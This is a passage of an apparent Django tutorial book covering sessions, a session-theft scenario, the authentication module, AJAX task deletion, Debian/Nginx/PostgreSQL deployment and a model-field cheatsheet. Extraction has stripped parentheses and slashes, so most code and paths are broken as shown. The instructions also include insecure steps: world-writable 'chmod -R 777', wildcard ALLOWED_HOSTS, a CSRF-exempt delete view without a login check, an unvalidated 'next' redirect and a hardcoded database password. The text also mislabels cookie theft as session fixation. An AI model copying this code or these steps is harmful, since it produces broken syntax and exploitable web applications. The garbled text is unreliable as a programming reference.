retrieve all existing tasks databases.   last_task = 0     In this line, we define last_task variable with a null value  without generating a bug when using the render   method.   if 'last_task' in request.session:     This line is used to check whether there is a session variable  named last_task.     last_task = Task.objects.get id = request.session['last_task']       In this line, we get the recording of the last task in our last_ task variable.     tasks_list = tasks_list.exclude id = request.session['last_task']       In this line, we exclude the last task for the queryset to not  have duplicates.   return render request, 'en public tasks_list.html', {'tasks_list':  tasks_list, 'last_task' : last_task}   [ 100 ]  Using Sessions   We will then create the template for our list. This example will be complete because  this list will create, read, update, and delete tasks. The following code must be placed  in the tasks_list.html file:  {% extends "base.html" %} {% block title_html %}   Tasks list {% endblock %} {% block article_content %}              Title       Description        Create         {% if last_task %}    <!-- This line checks to see if we have a record in the last_task  variable. If this variable has kept the value 0, the condition will  not be validated. In this way, the last accessed task will display at  the beginning of the list.-->               {{ last_task. title }}          {{ last_task.descriptiontruncatechars:25 }}          Edit           Delete <  td>         {% endif %}   {% for task in tasks_list %}                   {{ task.title }}<  a>         {{ task.descriptiontruncatechars:25 }}          Edit           Delete           {% endfor %}     {% endblock %}  [ 101 ]  Chapter 9   For this example to be complete, we must add the following lines in the style.css  file that we have created:  tr.important td {   font-weight:bold; }  These lines are used to highlight the row of the last task consulted.  About session security Session variables are not modifiable by the user because they are stored by the  server, unless if in your website you choose to store data sent by the client. However,  there is a type of flaw that uses the system session. Indeed, if a user cannot change  their session variables, they may try to usurp another user session.  We will imagine a realistic attack scenario. We are in a company that uses a website  to centralize e-mails and the schedule of each employee. An employee we appoint,  Bob, is very interested in one of his colleagues, Alicia. He wants to read her e-mails  to learn more about her. One day, when she goes to take her coffee in the break  room, Bob sits at Alicia's computer. Like all employees, he uses the same password  to ease administration, and he can easily connect to Alicia's PC. Luckily, the browser  has been left open. Besides, the browser periodically contacts the server to see if  new messages have arrived so that the session does not have time to expire. He  downloads a tool such as Firebug that allows him to read cookies. He retrieves  the hash, erases the traces, and returns to his computer. He changes the ID session  cookies in his browser; therefore, he has access to all the information about Alicia.  Moreover, when there is no encryption, this kind of attack can be done remotely in  a local network that sniffs network traffic. This is called session fixation. To protect  ourselves from this kind of attack, it is possible to take a few measures:     Encrypt communications between the server and client with SSL, for example.    Ask the user to enter a password before they can access sensitive information,   such as banking information.     Conduct an audit of the IP address and session number. Disconnect the    user if he she changes his her IP address. Notwithstanding this measure,  the attacker can perform an IP spoofing to usurp the IP's victim.  [ 102 ]  Using Sessions   Summary In this chapter, we managed to save data related to a user. This data is stored for the  whole duration of the session. It cannot be modified directly by the user.  We also studied the safety sessions. Keep in mind that a user session can be stolen by  an attacker. Depending on the size of the project, it is necessary to take measures to  secure the website.  In the next chapter, we will learn how to use the authentication module. It will allow  us to create users and restrict access to certain pages to the logged-in users.  [ 103 ]  Chapter 9    The Authentication Module  The authentication module saves a lot of time in creating space for users.   The following are the main advantages of this module:     The main actions related to users are simplified  connection, account   activation, and so on      Using this system ensures a certain level of security    Access restrictions to pages can be done very easily  It's such a useful module that we have already used it without noticing. Indeed, access  to the administration module is performed by the authentication module. The user we  created during the generation of our database was the first user of the site.  This chapter greatly alters the application we wrote earlier. At the end of this  chapter, we will have:     Modified our UserProfile model to make it compatible with the module    Created a login page    Modified the addition of developer and supervisor pages    Added the restriction of access to connected users  How to use the authentication module In this section, we will learn how to use the authentication module by making our  application compatible with the module.   Configuring the Django application There is normally nothing special to do for the administration module to work in our  TasksManager application. Indeed, by default, the module is enabled and allows us to  use the administration module. However, it is possible to work on a site where the web  Django authentication module has been disabled. We will check whether the module   is enabled.  In the INSTALLED_APPS section of the settings.py file, we have to check the  following line:  'django.contrib.auth',  Editing the UserProfile model The authentication module has its own User model. This is also the reason why  we have created a UserProfile model and not just User. It is a model that already  contains some fields, such as nickname and password. To use the administration  module, you have to use the User model on the Python33 Lib site-package  django contrib auth models.py file.   We will modify the UserProfile model in the models.py file that will become the  following:  class UserProfile models.Model :   user_auth = models.OneToOneField User, primary_key=True    phone = models.CharField max_length=20, verbose_name="Phone number",  null=True, default=None, blank=True    born_date = models.DateField verbose_name="Born date", null=True,  default=None, blank=True    last_connexion = models.DateTimeField verbose_name="Date of last  connexion", null=True, default=None, blank=True  years_seniority = models.IntegerField verbose_name="Seniority",  default=0  def __str__ self :   return self.user_auth.username  We must also add the following line in models.py:  from django.contrib.auth.models import User  In this new model, we have:     Created a OneToOneField relationship with the user model we imported    Deleted the fields that didn't exist in the user model  [ 106 ]  The Authentication Module   The OneToOne relation means that for each recorded UserProfile model, there will  be a record of the User model. In doing all this, we deeply modify the database. Given  these changes and because the password is stored as a hash, we will not perform the  migration with South.  It is possible to keep all the data and do a migration with South, but we should  develop a specific code to save the information of the UserProfile model to the  User model. The code should also generate a hash for the password, but it would be  long and it is not the subject of the book. To reset South, we must do the following:     Delete the TasksManager migrations folder and all the files contained in   this folder     Delete the database.db file  To use the migration system, we have to use the following commands already used  in the chapter about models:  manage.py schemamigration TasksManager --initial manage.py syncdb –migrate  After the deletion of the database, we must remove the initial data in   create_developer.py. We must also delete the URL developer_detail   and the following line in index.html:   Detail second developer   The second user must be a developer     Adding a user The pages that allow you to add a developer and supervisor no longer work because  they are not compatible with our recent changes. We will change these pages to  integrate our style changes. The view contained in the create_supervisor.py file   will contain the following code:  from django.shortcuts import render from TasksManager.models import Supervisor from django import forms from django.http import HttpResponseRedirect from django.core.urlresolvers import reverse   from django.contrib.auth.models import User def page request :   if request.POST:     form = Form_supervisor request.POST      if form.is_valid  :   [ 107 ]  Chapter 10         name           = form.cleaned_data['name']       login          = form.cleaned_data['login']       password       = form.cleaned_data['password']       specialisation = form.cleaned_data['specialisation']       email          = form.cleaned_data['email']       new_user = User.objects.create_user username = login, email =  email, password=password         In this line, we create an instance of the User model with  the create_user   method. It is important to use this method because  it can store a hashcode of the password in database. In this way, the  password cannot be retrieved from the database. Django uses the PBKDF2  algorithm to generate the hash code password of the user.       new_user.is_active = True        In this line, the is_active attribute defines whether the user  can connect or not. This attribute is false by default which allows  you to create a system of account verification by email, or other  system user validation.       new_user.last_name=name        In this line, we define the name of the new user.       new_user.save          In this line, we register the new user in the database.       new_supervisor = Supervisor user_auth = new_user,  specialisation=specialisation         In this line, we create the new supervisor with the form data.  We do not forget to create the relationship with the User model by  setting the property user_auth with new_user instance.       new_supervisor.save         return HttpResponseRedirect reverse 'public_empty'        else:       return render request, 'en public create_supervisor.html',  {'form' : form}    else:     form = Form_supervisor     form = Form_supervisor     return render request, 'en public create_supervisor.html', {'form' :  form}  class Form_supervisor forms.Form :   name = forms.CharField label="Name", max_length=30    login = forms.CharField label = "Login"    email = forms.EmailField label = "Email"    specialisation = forms.CharField label = "Specialisation"    password = forms.CharField label = "Password", widget = forms.

You can change the page   method in the create_developer.py file to make it  compatible with the authentication module  you can refer to downloadable   Packt code files for further help :  def page request :   if request.POST:     form = Form_inscription request.POST      if form.is_valid  :       name          = form.cleaned_data['name']       login         = form.cleaned_data['login']       password      = form.cleaned_data['password']       supervisor    = form.cleaned_data['supervisor']        new_user = User.objects.create_user username = login,  password=password        new_user.is_active = True       new_user.last_name=name       new_user.save         new_developer = Developer user_auth = new_user,  supervisor=supervisor        new_developer.save         return HttpResponse "Developer added"      else:       return render request, 'en public create_developer.html',  {'form' : form}    else:     form = Form_inscription       return render request, 'en public create_developer.html', {'form'  : form}   We can also modify developer_list.html with the following content:  {% extends "base.html" %} {% block title_html %}     Developer list {% endblock %} {% block h1 %}     Developer list  [ 109 ]  Chapter 10   {% endblock %} {% block article_content %}                              Name               Login               Supervisor                    {% for dev in object_list %}                               <!-- The following line displays the __str__ method of  the model. In this case it will display the username of the developer  -->                   {{ dev }}                   <!-- The following line displays the last_name of the  developer -->                  {{ dev.user_auth.last_name }}                  <!-- The following line displays the __str__ method of  the Supervisor model. In this case it will display the username of the  supervisor -->                  {{ dev.supervisor }}                        {% endfor %}       {% endblock %}  Login and logout pages Now that you can create users, you must create a login page to allow the user to  authenticate. We must add the following URL in the urls.py file:  url r'^connection$', 'TasksManager.views.connection.page',  name="public_connection" ,  You must then create the connection.py view with the following code:  from django.shortcuts import render from django import forms from django.contrib.auth import authenticate, login  This line allows you to import the necessary functions of the  authentication module. def page request :   if request.POST:    This line is used to check if the Form_connection form has been  posted. If mailed, the form will be treated, otherwise it will be  displayed to the user.     form = Form_connection request.POST    [ 110 ]  The Authentication Module       if form.is_valid  :       username = form.cleaned_data["username"]       password = form.cleaned_data["password"]       user = authenticate username=username, password=password         This line verifies that the username exists and the password  is correct.       if user:        In this line, the authenticate function returns None if  authentication has failed, otherwise it returns an object that  validates the condition.         login request, user           In this line, the login   function allows the user to  connect.     else:       return render request, 'en public connection.html', {'form' :  form}    else:     form = Form_connection     return render request, 'en public connection.html', {'form' : form}  class Form_connection forms.Form :   username = forms.CharField label="Login"    password = forms.CharField label="Password", widget=forms.

Your email : {{ user.email }}       <-- In this line, if the user is connected, this line will  display his her e-mail address.-->         {% else %}   <!-- In this line, if the user is not connected, we display the  login form.-->  [ 111 ]  Chapter 10        Connexion              {% csrf_token %}                 {{ form.as_table }}                         {% endif %} {% endblock %}  When the user logs in, Django will save his her data connection in session variables.  This example has allowed us to verify that the audit login and password was  transparent to the user. Indeed, the authenticate   and login   methods allow   the developer to save a lot of time. Django also provides convenient shortcuts   for the developer such as the user.is_authenticated attribute that checks if the   user is logged in. Users prefer when a logout link is present on the website, especially  when connecting from a public computer. We will now create the logout page.  First, we need to create the logout.py file with the following code:   from django.shortcuts import render from django.contrib.auth import logout def page request :     logout request      return render request, 'en public logout.html'   In the previous code, we imported the logout   function of the authentication  module and used it with the request object. This function will remove the user  identifier of the request object, and delete flushes their session data.  When the user logs out, he she needs to know that the site was actually  disconnected. Let's create the following template in the logout.html file:   {% extends "base.html" %} {% block article_content %}    You are not connected.  {% endblock %}  [ 112 ]  The Authentication Module   Restricting access to the connected  members When developers implement an authentication system, it's usually to limit access   to anonymous users. In this section, we'll see two ways to control access to our   web pages.  Restricting access to views The authentication module provides simple ways to prevent anonymous users from  accessing some pages. Indeed, there is a very convenient decorator to restrict access  to a view. This decorator is called login_required.  In the example that follows, we will use the designer to limit access to the page    view from the create_developer module in the following manner:  1.  First, we must import the decorator with the following line:  from django.contrib.auth.decorators import login_required  2.  Then, we will add the decorator just before the declaration of the view:  @login_required def page request :  This line already exists. Do not copy it.  3.  With the addition of these two lines, the page that lets you add a developer  is only available to the logged-in users. If you try to access the page without  being connected, you will realize that it is not very practical because the  obtained page is a 404 error. To improve this, simply tell Django what the  connection URL is by adding the following line in the settings.py file: LOGIN_URL = 'public_connection'  4.  With this line, if the user tries to access a protected page, he she will be   redirected to the login page. You may have noticed that if you're not logged  in and you click the Create a developer link, the URL contains a  parameter named next. The following is the screen capture of the URL:  5.  This parameter contains the URL that the user tried to consult. The   authentication module redirects the user to the page when he she connects.   To do this, we will modify the connection.py file we created. We add the  line that imports the render   function to import the redirect   function:  from django.shortcuts import render, redirect  [ 113 ]  Chapter 10   6.  To redirect the user after they log in, we must add two lines after the line that   contains the code login  request, user . There are two lines to be added:  if request.GET.get 'next'  is not None:   return redirect request.GET['next']   This system is very useful when the user session has expired and he she wants to  see a specific page.  Restricting access to URLs The system that we have seen does not simply limit access to pages generated by  CBVs. For this, we will use the same decorator, but this time in the urls.py file.  We will add the following line to import the decorator:  from django.contrib.auth.decorators import login_required  We need to change the line that corresponds to the URL named create_project:  url  r'^create_project$', login_required CreateView.as_ view model=Project, template_name="en public create_project.html",  success_url = 'index'  , name="create_project" ,  The use of the login_required decorator is very simple and allows the developer   to not waste too much time.  Summary In this chapter, we modified our application to make it compatible with the  authentication module. We created pages that allow the user to log in and log   out. We then learned how to restrict access to some pages for the logged in users.  In the next chapter, we will improve the usability of the application with the addition  of AJAX requests. We will learn the basics of jQuery and then learn how to use it to  make an asynchronous request to the server. Also, we will learn how to handle the  response from the server.  [ 114 ]  The Authentication Module   Using AJAX with Django  AJAX is an acronym for Asynchronous JavaScript and XML. This technology allows   a browser to asynchronously communicate with the server using JavaScript.  Refreshing the web page is not necessarily required to perform an action on the  server.  Many web applications have been released that run on AJAX. A web application  is often described as a website containing only one page and which performs all  operations with an AJAX server.  If you are not using a library, using AJAX requires a lot of lines of code to be  compatible with several browsers. When including jQuery, it is possible to make  easy AJAX requests while at the same time being compatible with many browsers.  In this chapter, we will cover:     Working with JQuery       Working with AJAX in the task manager  JQuery basics  Working with jQuery jQuery is a JavaScript library designed to effectively manipulate the DOM of the  HTML page. The DOM  Document Object Model  is the internal structure of the  HTML code, and jQuery greatly simplifies the handling.  The following are some advantages of jQuery:     DOM manipulation is possible with CSS 1-3 selectors        It integrates AJAX It is possible to animate the page with visual effects      Good documentation with numerous examples    Many libraries have been created around jQuery  jQuery basics In this chapter, we use jQuery to make AJAX requests. Before using jQuery,   let's understand its basics.  CSS selectors in jQuery CSS selectors used in style sheets can effectively retrieve an item with very little  code. This is a feature that is so interesting that it is implemented in the HTML5  Selector API with the following syntax:  item = document.querySelector 'tagid_content' ;  jQuery also allows us to use CSS selectors. To do the same thing with jQuery,   you must use the following syntax:  item = $ 'tagid_content' ;  At the moment, it is better to use jQuery than the Selector API because jQuery 1.x.x  guarantees great compatibility with older browsers.  Getting back the HTML content It is possible to get back the HTML code between two tags with the html   method:  alert $ 'divdiv_1' .html   ;  This line will display an alert with the HTML content of the   tag.  Concerning the input and textarea tags, it is possible to recover their content in the  same way as with the val   method.  Setting HTML content in an element Changing the content of a tag is very simple because we're using the same method  as the one we used for recovery. The main difference between the two is that we will  send a parameter to the method.  Thus, the following instruction will add a button in the div tag:  $ 'divdiv_1' .html $ 'divdiv_1' .html  +' JQuery ' ;  [ 116 ]  Using AJAX with Django   Looping elements jQuery also allows us to loop all the elements that match a selector. To do this,   you must use the each   method as shown in the following example:  var cases = $ 'nav ul li' .each function   {   $ this .addClass "nav_item" ; } ;  Importing the jQuery library To use jQuery, you must first import the library. There are two ways to add jQuery  to a web page. Each method has its own advantages, as outlined here:     Download jQuery and import it from our web server. Using this method, we  keep control over the library and we are sure that the file will be reachable if  we have our own website too.     Use the hosted libraries of the Google-hosted bookstores reachable from   any website. The advantage is that we avoid an HTTP request to our server,  which saves a bit of power.  In this chapter, we will host jQuery on our web server to not be dependent on a host.  We will import jQuery in all the pages of our application because we might need  multiple pages. In addition, the cache of the browser will keep jQuery for some time  so as not to download it too often. For this, we will download jQuery 1.11.0 and save  it on the TasksManager static javascript lib jquery-1.11.0.js file.  Then, you must add the following line in the head tag of the base.html file:     {% block head %}{% endblock %}  With these changes, we can use jQuery in all the pages of our website, and we can  add lines in the head block from the template which extends base.html.  [ 117 ]  Chapter 11   Working with AJAX in the task manager In this section, we will modify the page that displays the list of tasks for deleting   the tasks to be carried out in AJAX. To do this, we will perform the following steps:  1.  Add a Delete button on the task_list page. 2.  Create a JavaScript file that will contain the AJAX code and the function    that will process the return value of the AJAX request.  3.  Create a Django view that will delete the task.  We will add the Delete button by modifying the tasks_list.html template. To do  this, you must change the for task in task loop in tasks_list as follows:  {% for task in tasks_list %}           {{ task.title }}<  a>       {{ task.descriptiontruncatechars:25 }}        Edit        <button onclick="javascript:task_delete {{ task.id }}, '{% url  "task _delete_ajax" %}' ;">Delete       {% endfor %}  In the preceding code, we added an id property to the   tag. This property will  be useful in the JavaScript code to delete the task line when the page will receive the  AJAX response. We also replaced the Delete link with a Delete button that executes  the JavaScript task_delete   function. The new button will call the task_delete    function to execute the AJAX request. This function accepts two parameters:     The identifier of the task    The URL of the AJAX request  We will create this function in the static javascript task.js file by adding the  following code:  function task_delete id, url {   $.ajax {     type: 'POST',         Here, we define the used method to send data to the Django  views. Other values are possible as POST, GET, and other HTTP request  methods.     url: url,         This line is used to specify the URL that will process the  request.  [ 118 ]  Using AJAX with Django       data: {task: id},         The data property is used to define the data that will be sent  with the AJAX request.     dataType:'json',         This line defines the type of data that we are expecting back  from the server. We do not necessarily need JSON in this example, but  when the response is more complete, we use this kind of data type.     success: task_delete_confirm,        The success property allows us to define a function that will  be executed when the AJAX request works. This function receives as a  parameter the AJAX response.     error: function    {alert 'AJAX error.' ;}         The error property can define a function when the AJAX request  does not work. We defined in the previous code an anonymous function  that displays an AJAX error to the user.   } ; } function task_delete_confirm response  {   task_id = JSON.parse response ;       This line is in the function that receives the AJAX response when  the request was successful. This line allows deserializing the JSON  response returned by Django views.   if  task_id>0  {     $ 'task_'+task_id .remove  ;         This line will delete the   tag containing the task we have  just removed   }   else {     alert 'Error' ;   } }  We must add the following lines after the title_html block in the tasks_list. html template to import task.js in the template:  {% load static %} {% block head %}      {% endblock %}  We must add the following URL to the urls.py file:    url r'^task-delete-ajax$', 'TasksManager.views.ajax.task_delete_ ajax.page', name="task_delete_ajax" ,  [ 119 ]  Chapter 11   This URL will use the views contained in the view ajax task_delete_ajax.py file.  We must create the AJAX module with the __init__.py file and our   task_delete_ajax.py file with the following content:  from TasksManager.models import Task from django.http import HttpResponse from django import forms from django.views.decorators.csrf import csrf_exempt  We import the csrf_exempt decorator that we will use to line 4. import json  We import the json module we use to line 8. class Form_task_delete forms.Form :  We create a form with a task field that contains the identifier  of the task. When we create a form it allows us to use the Django  validators to check the contents of the data sent by AJAX. Indeed, we  are not immune that the user sends data to hack our server.   task       = forms.IntegerField   @csrf_exempt  This line allows us to not verify the CSRF token for this view.  Indeed, with AJAX we cannot reliably use the CSRF protection. def page request :   return_value="0"    We create a variable named return_value that will contain a code  returned to our JavaScript function. We initialize the value 0 to the  variable.   if len request.POST  > 0:     form = Form_task_delete request.POST      if form.is_valid  :      This line allows us to verify the validity of the value sent by  the AJAX request.       id_task = form.cleaned_data['task']       task_record = Task.objects.get id = id_task        task_record.delete         return_value=id_task        If the task been found, the return_value variable will contain  the value of the id property after removing the task. This value will  be returned to the JavaScript function and will be useful to remove  the corresponding row in the HTML table.    The following line contains two significant items. The json. dumps   function will return a serialized JSON object. Serialization  allows encoding an object sequence of characters. This technique  allows different languages to share objects transparently. We also  define a content_type to specify the type of data returned by the  view.   return HttpResponse json.dumps return_value , content_type =  "application json"   [ 120 ]  Using AJAX with Django   Summary In this chapter, we learned how to use jQuery. We saw how to easily access the DOM  with this library. We also created an AJAX request on our TasksManager application  and we wrote the view to process this request.   In the next chapter, we will learn how to deploy a Django project based on the Nginx  and PostgreSQL server. We will see and discuss the installation step by step.  [ 121 ]  Chapter 11    Production with Django  When the development phase of a website is complete and you want to make it  accessible to users, you must deploy it. The following are the steps to do this:      Completing the development    Selecting the physical server    Selecting the server software    Selecting the server database    Installing PIP and Python 3 Installing PostgreSQL    Installing Nginx       Installing virtualenv and creating a virtual environment    Installing Django, South, Gunicorn, and psycopg2    Configuring PostgreSQL    Adaptation of Work_manager to the production       Using Gunicorn    Starting Nginx  Initial South migration  Completing the development It is important to carry out some tests before starting the deployment. Indeed,   when the website is deployed, problems are harder to solve; it can be a huge   waste of time for the developers and users. That's why I emphasize once again:   you must overdo tests!   Selecting the physical server A physical server is the machine that will host your website. It is possible to host  your own website at home, but this is not suitable for professional websites. Indeed,  as many web users use the site, it is necessary to use a web host. There are so many  different types of accommodations, as follows:     Simple hosting: This type of hosting is suitable for websites that need   quality service without having a lot of power. With this accommodation, you  do not have to deal with system administration, but it does not allow the  same flexibility as dedicated servers. This type of hosting also has another  disadvantage with Django websites: there are not many hosts offering a  compatible accommodation with Django yet.     A dedicated server: This is the most flexible type of accommodation.    We rent  or buy  a server with a web host that provides us with an Internet  connection and other services. The prices are different depending on the  desired configuration, but powerful servers are very expensive. This type of  accommodation requires you to deal with system administration, unless you  subscribe to an outsourcing service. An outsourcing service allows you to use  a system administrator who will take care of the server against remuneration.     A virtual server: Virtual servers are very similar to dedicated servers. They  are usually less expensive because some virtual servers can run on a single  physical server. Hosts regularly offer additional services such as server hot  backups or replication.  Choosing a type of accommodation should be based on your needs and financial  resources.  The following is a nonexhaustive list of hosts that offer Django:     alwaysdata    WebFaction    DjangoEurope    DjangoFoo Hosting  Selecting the server software During the development phase, we used the server that comes with Django. This  server is very convenient during development, but it is not suitable for a production  website. Indeed, the development server is neither efficient nor secure. You have to  choose another type of server to install it. There are many web servers; we selected  two of them:  [ 124 ]  Production with Django      Apache HTTP Server: This has been the most-used web server since 1996,   according to Netcraft. It is a modular server that allows you to install  modules without the need to compile the server. In recent years, it's been  used less and less. According to Netcraft, in April 2013, the market share   was 51 percent.     Nginx: Nginx is known for its performance and low memory consumption.  It is also modular, but the modules need to be integrated in the compilation.  In April 2013, Nginx was used by 14 percent of all the websites whose web  server Netcraft knows about.  Selecting the server database The choice of server database is important. Indeed, this server will store all   the data of the website. The main characteristics that are sought after in a   database are performance, safeness, and reliability.  The choice depends on the importance of these three criteria:     Oracle: This database is a system database developed by Oracle Corporation.   There is a free open source version of this database, but its features are  limited. This is not a free-of-charge database.     MySQL: This is a database system that belongs to Oracle  since the purchase  of Sun Microsystems . It is a widely used database on the Web, including the  LAMP  Linux Apache MySQL PHP  platform. It is distributed under a dual  GPL and a proprietary license.     PostgreSQL: This is a system of free databases distributed under the BSD   license. This system is known to be stable and offers advanced features    such as the creation of data types .     SQLite: This is the system that we used during the development of our  website. It is not suitable for a website that gets a lot of visitors. Indeed,  the entire database is in a SQLite file and does not allow a competitor to  access the data. Furthermore, there is no user or system without a security  mechanism. However, it is quite possible to use it to demonstrate to a client.     MongoDB: This is a document-oriented database. This database system  is classified as a NoSQL database because it uses a storage architecture  that uses the BSON  binary JSON  format. This system is popular in  environments where the database is distributed among several servers.  [ 125 ]  Chapter 12   Deploying the Django website For the rest of the book, we will use the HTTP Nginx server and PostgreSQL  database. The chapter's explanation will be made on a GNU   Linux Debian   7.3.0 32-bit system. We will start with a new Debian operating system without   any installations.  Installing PIP and Python 3 For the following commands, you must log on with a user account that has the same  privileges as a superuser account. For this purpose, run the following command:  su  After this command, you must type the root password.  First, we update the Debian repositories:  apt-get update  Then, we install Python 3 and PIP as done in Chapter 2, Creating a Django Project:  apt-get install python3  apt-get install python3-pip  alias pip=pip-3.2  Installing PostgreSQL We will install four packages to be able to use PostgreSQL:  apt-get install libpq-dev python-dev postgresql postgresql-contrib  Then, we will install our web Nginx server:  apt-get install nginx  [ 126 ]  Production with Django   Installing virtualenv and creating a virtual  environment We have installed Python and PIP as done in Chapter 2, Creating a Django Project,  but before installing Django, we will install virtualenv. This tool is used to create  virtual environments for Python and to have different library versions on the same  operating system. Indeed, on many Linux systems with Debian, a version of Python  2 is already installed. It is recommended that you do not uninstall it to keep the  system stable. We will install virtualenv to set our own environments and facilitate  our future Django migration:  You must then create a folder that will host your virtual environments:  pip install virtualenv  mkdir  home env  The following command creates a virtual environment named django1.6 in the   home env  folder:  virtualenv  home env django1.6  We will then provide all the rights to all the users to access the folder of the  environment by issuing the following command. From the point of view of safety,   it would be better to restrict access by user or group, but this will take a lot of time:  cd  home   chmod -R 777 env   exit  Installing Django, South, Gunicorn,   and psycopg2 We will install Django and all the components that are needed for Nginx and  Django to be able to communicate. We will first activate our virtual environment.  The following command will connect us to the virtual environment. As a result, all  Python commands made from this environment can only use packages installed in  this environment. In our case, we will install four libraries that are only installed in  our virtual environment. For the following commands, you must log in as a user  who does not have the superuser privileges. We cannot perform the following  commands from the root account because we need virtualenv. However, the root  account sometimes overrides the virtual environment to use Python from the system,  instead of the one present in the virtual environment.  [ 127 ]  Chapter 12   source  home env django1.6 bin activate  pip install django=="1.6"  pip install South  Gunicorn is a Python package that plays the role of a WSGI interface between Python  and Nginx. To install it, issue the following command:  psycopg2 is a library that allows Python and PostgreSQL to communicate with each  other:  To reconnect as a superuser, we have to disconnect from the virtual environment:  Configuring PostgreSQL For the following commands, you must log on with a user account that has the same  privileges as a superuser. We will connect to the PostgreSQL server:  pip install gunicorn   pip install psycopg2  deactivate  su  su - postgres  createdb workmanager  createuser -P   The following command creates a database called workmanager:  We will then create a user for PostgreSQL. After entering the following command,  more information is requested:  The following lines are the information requested by PostgreSQL for the new user  and the responses  used for this chapter :  Role name : workmanager  Password : workmanager  Password confirmation : workmanager  Super user : n  Create DB : n  Create new roles : n  [ 128 ]  Production with Django   Then, we must connect to the PostgreSQL interpreter:  We give all the rights to our new user on the new database:  GRANT ALL PRIVILEGES ON DATABASE workmanager TO workmanager;  Then, we quit the SQL interpreter and the connection to PostgreSQL:  psql   \q  exit  Adaptation of Work_manager to production For the following commands, you must log in as a user who does not have the  superuser privileges.   At this stage of deployment, we have to copy the folder that contains our Django  project. The folder to be copied is the Work_manager folder  which contains the  Work_manager and TasksManager folders and the manage.py file . We will copy it to  the root of the virtual environment, that is, in  home env django1.6.  To copy it, you can use the means you have at your disposal: a USB key, SFTP, FTP,  and so on. We then need to edit the settings.py file of the project to adapt it to the  deployment.  The part that defines the database connection becomes the following:  DATABASES = {     'default': {         'ENGINE': 'django.db.backends.postgresql_psycopg2',          'NAME':  'workmanager',               'USER': 'workmanager',                              'PASSWORD': 'workmanager',                          'HOST': '127.0.0.1',                              'PORT': '',                          } }  We must modify the ALLOWED_HOSTS line with the following:  ALLOWED_HOSTS = ['*']  [ 129 ]  Chapter 12   Also, it is important to not use the DEBUG mode. Indeed, the DEBUG mode can provide  valuable data to hackers. For this, we must change the DEBUG and TEMPLATE_DEBUG  variables in the following way:   DEBUG = False TEMPLATE_DEBUG = False  Initial South migration We activate our virtual environment to perform the migration and launch Gunicorn:  cd  home env django1.6 Work_manager   source  home env django1.6 bin activate  python3.2 manage.py schemamigration TasksManager --initial  python3.2 manage.py syncdb -–migrate  Sometimes, the creation of the database with PostgreSQL generates an error when  everything goes well. To see if the creation of the database went well, we must  run the following commands as the root user and verify that the tables have been  created:  su - postgres  psql -d workmanager  su  \dt  \q  exit  If they were properly created, you have to make a fake South migration to manually  tell it that everything went well:  python3.2 manage.py migrate TasksManager --fake  Using Gunicorn We then start our WSGI interface for Nginx to communicate with:  gunicorn Work_manager.wsgi  [ 130 ]  Production with Django   Starting Nginx Another command prompt as the root user must run Nginx with the following  command:  su  service nginx start  Now, our web server is functional and is ready to work with many users.  Summary In this chapter, we learned how to deploy a Django website with a modern  architecture. In addition, we used virtualenv, which allows you to use several  versions of Python libraries on the same system.  In this book, we learned what the MVC pattern is. We have installed Python and  Django for our development environment. We learned how to create templates,   views, and models. We also used the system for routing Django URLs. We also   learned how to use some specific elements such as Django forms, CBV, or the  authentication module. Then, we used session variables and AJAX requests.   Finally, we learned how to deploy a Django website on a Linux server.  [ 131 ]  Chapter 12    Cheatsheet  When a developer has learned how to use a technology, it is often necessary to  search for new information or syntax. He she can waste a lot of time doing this. The  purpose of this appendix is to provide a quick reference for Django developers.  The field types in models The following sections cover a nonexhaustive list of the field types in models.  The model fields are those that will be saved in the database. Depending on the  database system selected, the type field may be different depending on the database  used.  The types are specified with their options in the following manner:  Type  option1 = example_data, option2 = example_data  [information]  The numerical field type Fields presented in this section are numeric fields such as integers and decimals:     SmallIntegerField  : This defines a small integer field; for some databases,   the lower value is 256     IntegerField  : This defines an integer field    BigIntegerField  : Accuracy is 64 bits, from -9223372036854775808 to   9223372036854775807     DecimalField  max_digits = 8, decimal_places = 2    The descriptions of the options are as follows:     max_digits: This sets the number of digits that make up the whole number    decimal_places: This sets the number of digits that compose the decimal   part of the number  The string field type This section contains the types of fields that contain strings:     CharField  max_length = 250     TextField  max_length = 250 : This field has the distinction of being   presented as a   tag in the Django forms     EmailField  max_length = 250 : This field is CharField that contains an   e-mail validator for Django forms  The description of the option is as follows:     max_length: This sets the maximum number of characters that compose    the string  The temporal field type This section contains the types of fields that contain temporal data:     DateField  auto_now = false, auto_now_add = true     DateTimeField  auto_now = false, auto_now_add = true     TimeField  auto_now = false, auto_now_add = true   The descriptions of the options are as follows:     auto_now: This automatically sets the field to the current time each time       auto_now_add: This automatically sets the field to the current time when an   a record is saved  object is created  [ 134 ]  Cheatsheet   Other types of fields This section contains the types of fields that do not belong to the previous categories:     BooleanField      FileField:  upload_to = "path", max_length="250" : This field is   used to store files on the server     ImageField upload_to = "path", max_length="250", height_field   =height_img, width_field= width_img : This field corresponds to  FileField but imparts special treatment to images such as storing the  image's height and width  The descriptions of the options are as follows:     Upload_to: This defines the folder that will store the files corresponding to   this field.     max_length: The FileField and ImageField fields are actually text fields   that store the path and name of the uploaded file.     height_field and width_field: These take an integer field of the model as   an argument. This field is used to store the size of the image.  Relationship between models This section contains the types of fields that define the relationships between models:     ForeignKey  model, related_name = "foreign_key_for_dev", to_ field="field_name", limit_choices_to=dict_or_Q, on_delete=      OneToOneField  model, related_name = "foreign_key_for_dev", to_  field="field_name", limit_choices_to=dict_or_Q, on_delete=      ManyToManyField  model, related_name = "foreign_key_for_dev",  to_field="field_name", limit_choices_to=dict_or_Q, on_delete=   The descriptions of the options are as follows:     model: Here, you must specify the name of the model class you want to use.    related_name: This allows you to name the relationship. It is essential when   multiple relationships to the same model exist.     to_field: This defines a relationship to a specific field of the model. By   default, Django creates a relationship to the primary key.     on_delete: The database action on the removal of a field can be CASCADE,   PROTECT, SET_NULL, SET_DEFAULT, and DO_NOTHING.     limit_choices_to: This defines the queryset that restricts records for    the relationship.  [ 135 ]  Appendix   The model meta attributes The model meta attributes are to be defined in a meta class in the model in the  following way:  class Product models.Model :   name = models.CharField     class Meta:     verbose_name = "product"  The following attributes are used to define information about the model in which  they are placed:     db_tables: This sets the name of the table stored in the database    verbose_name: This sets the name of a record for the user    verbose_name_plural: This sets the name of several records for the user    ordering: This sets a default order when listing records  Options common to all fields of models The following options are common to all the fields of a model:     default: This sets a default value for the field.    null: This enables the null value for the field and makes an optional   relationship if this option is defined on a relationship field.     blank: This enables you to leave the field empty.    error_messages: This specifies a series of error messages.    help_text: This sets a help message.    unique: This defines a field that does not contain duplicates.    verbose_name: This defines a field name that is readable by a human.    Do not put a 